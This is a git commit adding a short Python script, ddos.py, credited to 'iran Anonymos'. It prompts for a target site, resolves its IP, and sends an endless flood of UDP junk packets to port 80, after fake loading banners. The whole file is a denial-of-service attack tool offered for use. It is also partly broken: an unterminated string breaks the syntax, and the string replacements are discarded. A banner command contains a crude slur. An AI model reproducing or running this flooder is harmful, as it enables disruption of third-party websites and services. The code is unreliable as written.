4db2492d06022f2ba4cc756907c8984fdba338f5
yen yang majaze <103533467+hacker112281@users.noreply.github.com>
2022-05-16 23:38:37 +0430

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,44 @@
+import os
+import time
+import socket
+
+print("iran Anonymos")
+time.sleep(5)
+red='\033[31m'
+green='\033[32m'
+os.system("clear")
+os.system("toilet -f mono12 -F gay iran hacker")
+
+print(" ∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆
+            ∆   iranAnonymos... tem... my name  :     ∆
+           ∆    	                                                               ∆
+           ∆  yen yang majaze                  origenal     ∆               
+           ∆                                                                       ∆
+            ∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆
+target = input(f"{green} : ")
+target.replace("http://", "")
+target.replace("https://","")
+target.replace("www.","")
+ip = socket.gethostbyname(target)
+port = 80
+joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
+os.system("clear")
+os.system("toilet -f mono12 LOADING | lolcat")
+print("chek{... }5%")
+time.sleep(1)
+print("Security ~~~ 10%")
+time.sleep(2)
+print("Loading{♕♕♕ }40%")
+time.sleep(2)
+print("amade saze {☆☆☆☆}90%")
+time.sleep(3)
+print("goooooooooo{♡♡♡♡♡100%")
+time.sleep(4)
+print("please wait")
+time.sleep(6)
+os.system("clear")
+os.system("figlet Attack_Starting")
+while True:
+     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+     sock.sendto(bytes(joker,"UTF-8"), (ip,port))
+     print(port," packet to site ",ip)
